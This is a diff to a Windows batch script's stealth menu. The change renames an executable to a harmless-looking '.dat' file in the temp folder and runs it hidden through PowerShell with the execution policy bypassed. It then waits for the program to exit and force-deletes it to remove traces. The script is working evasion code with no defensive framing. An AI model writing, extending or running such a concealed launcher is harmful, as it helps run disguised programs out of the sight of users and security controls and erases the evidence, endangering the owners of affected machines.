@@ -76,17 +76,19 @@ goto STEALTH_MENU
 
 
 :RUN
-echo Preparing to launch EXE...
+cls
+echo [*] Preparing to launch disguised EXE...
+set "DISGUISED_EXE=%temp%\user_data_blob.dat"
 
-if not exist "%DISGUISED_EXE%" (
-    echo [!] Disguised EXE not found. Please run Setup first.
-    pause
-    goto STEALTH_MENU
-)
+:: Copy disguised EXE from GitHub copy
+copy /Y "%temp%\CAXVN.exe" "%DISGUISED_EXE%" >nul 2>&1
 
-start "" "%DISGUISED_EXE%"
+echo [*] Running silently...
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden ^
+  -Command "Start-Process -FilePath '%DISGUISED_EXE%' -WindowStyle Hidden"
 
-:: Wait for the EXE to finish before continuing cleanup
+echo [*] Waiting for EXE to finish...
+
 :WAIT_LOOP
 timeout /t 2 >nul
 tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
@@ -94,9 +96,12 @@ if not errorlevel 1 (
     goto WAIT_LOOP
 )
 
-echo EXE closed.
+echo [✓] EXE has exited. Cleaning up...
+del /f /q "%DISGUISED_EXE%" >nul 2>&1
+echo [✓] Cleanup complete.
 pause
 goto STEALTH_MENU
+
 
 
 
